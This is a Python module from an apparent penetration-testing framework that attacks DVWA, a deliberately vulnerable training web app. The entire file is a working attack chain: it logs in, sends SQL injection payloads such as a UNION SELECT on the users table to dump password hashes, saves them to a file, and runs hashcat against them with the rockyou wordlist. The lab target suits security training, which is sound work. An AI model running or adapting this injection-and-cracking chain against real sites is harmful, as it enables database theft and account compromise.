"""
modules/sqli/sqli.py
DVWA SQL Injection + hash dumping + hashcat cracking
"""

import os
import re
import subprocess
from bs4 import BeautifulSoup
from dvwa_base import DVWABase
from utils import colored


class DVWASQLI(DVWABase):
    def __init__(self):
        super().__init__()
        self.name        = "dvwa_sqli"
        self.description = "DVWA SQL Injection — dump users table + crack hashes with hashcat"

        self.options.update({
            "WORDLIST": {
                "value":    "/usr/share/wordlists/rockyou.txt",
                "required": False,
                "description": "Wordlist path for hashcat",
            },
        })

        self._hashes_file = "dvwa_hashes.txt"
        self._vuln_url    = ""

    # ------------------------------------------------------------------
    # Help
    # ------------------------------------------------------------------
    def show_help(self):
        print(colored("\n=== DVWA SQL Injection Module ===", "orange"))
        print(self.description)
        print("\nWorkflow:")
        print("  1. set RHOST (and optionally WORDLIST)")
        print("  2. run  →  login → dump hashes → crack with hashcat")
        print("\nCommands:")
        print("  run / exploit        - Full attack chain")
        print("  set <option> <value> - Set an option")
        print("  show options         - Show current settings")
        print("  back / exit          - Return to framework\n")

    # ------------------------------------------------------------------
    # Command dispatcher
    # ------------------------------------------------------------------
    def handle_command(self, cmd_input: str):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) == 3:
                self.set_option(parts[1], parts[2])
            else:
                print("Usage: set <option> <value>")
            return

        if low in ["run", "exploit"]:
            self.run()
            return

        if low in ["back", "exit", "quit"]:
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------
    def run(self):
        if not self.login():
            return

        self._vuln_url = f"{self.base_url}/vulnerabilities/sqli/"
        hashes = self._dump_hashes()

        if not hashes:
            print(colored("[-] No MD5 hashes found. Check security level and /setup.php.", "red"))
            return

        self._save_hashes(hashes)
        self._crack_hashes()

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------
    def _dump_hashes(self) -> set:
        payloads = [
            "1' UNION SELECT user, password FROM users-- ",
            "1' UNION SELECT NULL, CONCAT(user, ':', password) FROM users-- ",
            "1' OR '1'='1-- ",
        ]
        found: set = set()

        for payload in payloads:
            print(colored(f"  [*] Trying: {payload}", "yellow"))
            try:
                r = self.session.post(
                    self._vuln_url,
                    data={"id": payload, "Submit": "Submit"},
                    timeout=5,
                )
                text = BeautifulSoup(r.text, "html.parser").get_text(separator="\n", strip=True)
                for h in re.findall(r"[a-f0-9]{32}", text, re.IGNORECASE):
                    h = h.lower()
                    if h not in found:
                        found.add(h)
                        print(colored(f"      [+] Hash: {h}", "green"))
            except Exception as exc:
                print(colored(f"      [-] Request failed: {exc}", "red"))

        return found

    def _save_hashes(self, hashes: set):
        with open(self._hashes_file, "w") as fh:
            fh.write("\n".join(hashes) + "\n")
        print(colored(f"[+] {len(hashes)} hash(es) saved to {self._hashes_file}", "green"))

    def _crack_hashes(self):
        wordlist = self.options["WORDLIST"]["value"]
        if not os.path.exists(wordlist):
            print(colored(f"[-] Wordlist not found: {wordlist}", "red"))
            return

        print(colored("[*] Running hashcat (mode 0 = MD5)...", "yellow"))
        try:
            subprocess.run(
                ["hashcat", "-m", "0", "-a", "0", "-O", "--force",
                 self._hashes_file, wordlist],
                check=False,
            )
            result = subprocess.run(
                ["hashcat", "-m", "0", self._hashes_file, "--show"],
                capture_output=True, text=True,
            )
            print(colored("\nCracked passwords:", "green"))
            print(result.stdout if result.stdout.strip() else "  (none cracked)")
        except Exception as exc:
            print(colored(f"[-] Hashcat error: {exc}", "red"))
